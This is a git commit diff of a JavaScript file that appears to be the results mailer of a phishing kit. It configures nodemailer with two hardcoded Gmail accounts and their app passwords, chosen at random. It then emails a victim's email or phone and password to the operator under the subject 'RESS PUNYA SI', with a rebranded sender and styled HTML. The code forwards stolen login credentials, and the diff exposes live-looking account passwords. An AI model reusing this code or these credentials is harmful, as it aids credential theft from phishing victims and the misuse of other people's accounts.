3cbd392a9661c6406aa0700c1de01f6053009d69
SohardtoLang <119798959+SohardtoLang@users.noreply.github.com>
2023-01-23 11:34:26 +0700

    Update v2

--- test.js
+++ test.js
@@ -19,13 +19,22 @@ function sleep(ms) {
   });
 }
 
+ahut= [{
+  user: 'alfauziaha866@gmail.com',
+  pw: 'atsxrrfxcmsuxeho'
+},
+{
+  user: 'coxxiofficial@gmail.com',
+  pw: 'fxvbymzppqhspnfk'
+}]
 
+anu = getRandomItem(ahut)
 // async..await is not allowed in global scope, must use a wrapper
 var transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-      user: 'alfauziaha866@gmail.com',
-      pass: "atsxrrfxcmsuxeho",
+      user: anu.user,
+      pass: anu.pw,
     },
 });
 
@@ -35,12 +44,12 @@ var ip = (Math.floor(Math.random() * 255) + 1)+"."+(Math.floor(Math.random() * 2
 
 const sendMail = (email, user, pass)=>{
   const options = {
-    from: 'RianPedia <support@gmail.com>',
+    from: 'CoxxiStore <support@gmail.com>',
     to: email,
     subject: 'RESS PUNYA SI || '+user,
-    html: `<div style="background: url(https://i.postimg.cc/vTBb2Rty/20230121-185635.jpg) no-repeat;border:2px solid white;background-size: 100% 100%; width: 294; height: 101px; color: #996633; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
+    html: `<div style="background: url(https://i.postimg.cc/1zq2bnDB/IMG-20230123-WA0178.jpg) no-repeat;border:2px solid white;background-size: 100% 100%; width: 294; height: 101px; color: #996633; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
 </div>
- <table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid white; border-collapse:collapse;width:100%;background:#996633;">
+ <table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid white; border-collapse:collapse;width:100%;background:red;">
     <tr>
 <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Email/Phone</b></th>
 <th style="padding:3px;width: 65%; text-align: center;"><b>${user}</th> 
